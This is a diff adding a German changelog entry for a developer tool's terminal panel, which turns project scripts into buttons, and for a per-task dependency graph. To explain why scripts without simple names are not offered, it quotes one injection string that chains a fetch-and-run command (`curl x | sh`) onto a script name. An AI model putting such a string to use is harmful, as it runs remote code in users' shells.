@@ -6,6 +6,17 @@ Die Versionen vor 0.6.0 stehen auf Englisch im CHANGELOG des Repositorys.
 
 ### Neu
 
+- **Das Terminal-Panel bietet die Skripte des Projekts als Knöpfe an.** Den Dev-Server zu starten
+  hieß, ein Terminal zu öffnen und einzutippen, was im Projekt längst steht. Das Panel liest es
+  jetzt: die `scripts` einer package.json, die Targets eines Makefiles und cargos übliche vier. Je
+  ein Knopf, die häufigsten zuerst — dev, start, build, test. Jeder öffnet einen eigenen Tab, benannt
+  nach dem Skript statt „PowerShell 3", damit der Tab mit dem Server wiederzufinden ist. Drückst du
+  ein Skript, das schon läuft, bringt es dich dorthin, statt ein zweites zu starten, das den Kampf
+  um den Port verliert; ein grüner Punkt markiert die laufenden. Der Paketmanager kommt aus der
+  Lockdatei, denn `npm run` löst in einem pnpm-Workspace einen anderen Baum auf. Ein Skript, dessen
+  Name kein einfacher Name ist, wird gar nicht angeboten: diese Zeichenketten landen in einer echten
+  Shell, wo `predev && curl x | sh` genau so liefe, wie es dasteht.
+
 - **Der Abhängigkeitsgraph wird von einer Aufgabe aus geöffnet und zeigt nur deren Familie.** Früher
   war er eine zweite Ansicht des ganzen Boards und zeichnete jede Kette des Projekts nebeneinander:
   er wurde breiter als das Fenster, und die Antwort auf „womit hängt diese hier zusammen?" lag
